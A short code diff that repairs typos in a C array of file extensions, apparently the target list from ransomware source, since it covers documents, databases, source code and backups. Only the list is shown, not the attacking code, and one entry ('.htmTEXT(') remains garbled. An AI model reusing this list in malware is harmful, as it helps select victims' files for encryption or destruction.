@@ -2,7 +2,7 @@
 
 LPCTSTR pcszFileExts[] = {
 	TEXT(".doc"), TEXT(".docx"), TEXT(".xls"), TEXT(".xlsx"), TEXT(".ppt"), TEXT(".pptx"), TEXT(".pst"),
-	TEXT(".ost"), TEXT(".msg"), TEXT(".emTEXT("), TEXT(".vsd"), TEXT(".vsdx"), TEXT(".txt"), TEXT(".csv"),
+	TEXT(".ost"), TEXT(".msg"), TEXT(".em"), TEXT(".vsd"), TEXT(".vsdx"), TEXT(".txt"), TEXT(".csv"),
 	TEXT(".rtf"), TEXT(".123"), TEXT(".wks"), TEXT(".wk1"), TEXT(".pdf"), TEXT(".dwg"), TEXT(".onetoc2"),
 	TEXT(".snt"), TEXT(".jpeg"), TEXT(".jpg"), TEXT(".docb"), TEXT(".docm"), TEXT(".dot"), TEXT(".dotm"),
 	TEXT(".dotx"), TEXT(".xlsm"), TEXT(".xlsb"), TEXT(".xlw"), TEXT(".xlt"), TEXT(".xlm"), TEXT(".xlc"),
@@ -20,7 +20,7 @@ LPCTSTR pcszFileExts[] = {
 	TEXT(".ps1"), TEXT(".bat"), TEXT(".cmd"), TEXT(".js"), TEXT(".asm"), TEXT(".h"), TEXT(".pas"), TEXT(".cpp"),TEXT(".c"),TEXT(".css"),
 	TEXT(".htmTEXT("),
 	TEXT(".cs"), TEXT(".suo"), TEXT(".sln"), TEXT(".ldf"), TEXT(".mdf"), TEXT(".ibd"), TEXT(".myi"), TEXT(".myd"), TEXT(".frm"),
-	TEXT(".odb"), TEXT(".dbf"), TEXT(".db"), TEXT(".mdb"), TEXT(".accdb"), TEXT(".sqTEXTL"), TEXT(".sqlitedb"), TEXT(".sqlite3"),
+	TEXT(".odb"), TEXT(".dbf"), TEXT(".db"), TEXT(".mdb"), TEXT(".accdb"), TEXT(".sql"), TEXT(".sqlitedb"), TEXT(".sqlite3"),
 	TEXT(".asc"), TEXT(".lay6"), TEXT(".lay"), TEXT(".mmL"), TEXT(".sxm"), TEXT(".otg"), TEXT(".odg"), TEXT(".uop"), TEXT(".std"),
 	TEXT(".sxd"), TEXT(".otp"), TEXT(".odp"), TEXT(".wb2"), TEXT(".slk"), TEXT(".dif"), TEXT(".stc"), TEXT(".sxc"), TEXT(".ots"),
 	TEXT(".ods"), TEXT(".3dm"), TEXT(".max"), TEXT(".3ds"), TEXT(".uot"), TEXT(".stw"), TEXT(".sxw"), TEXT(".ott"), TEXT(".odt"),
